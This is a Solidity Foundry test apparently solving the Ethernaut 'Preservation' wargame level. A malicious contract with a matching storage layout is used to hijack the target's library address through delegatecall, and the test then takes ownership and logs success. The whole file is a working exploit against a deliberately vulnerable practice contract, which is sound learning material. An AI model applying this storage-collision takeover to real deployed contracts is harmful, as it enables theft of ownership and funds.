// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {Preservation,LibraryContract} from "src/Preservation.sol";

contract Preservation_POC is Test {
    Preservation _preservation;
    LibraryContract _libraryContract1;
    LibraryContract _libraryContract2;
    function init() private{
        vm.startPrank(address(0x10));
        _libraryContract1= new LibraryContract();
        _libraryContract2= new LibraryContract();
        _preservation = new Preservation(address(_libraryContract1), address(_libraryContract2));
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Preservation_POC() public{
        Preservationattck _preservationattck = new Preservationattck();
        _preservation.setFirstTime(uint256(uint160(address(_preservationattck))));
        _preservation.setFirstTime(uint256(uint160(address(this))));
        console.log("Success:",_preservation.owner()==address(this));

    }
}

contract Preservationattck {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    function setTime(uint256 _address) public {
        owner = address(uint160(_address));
    }
}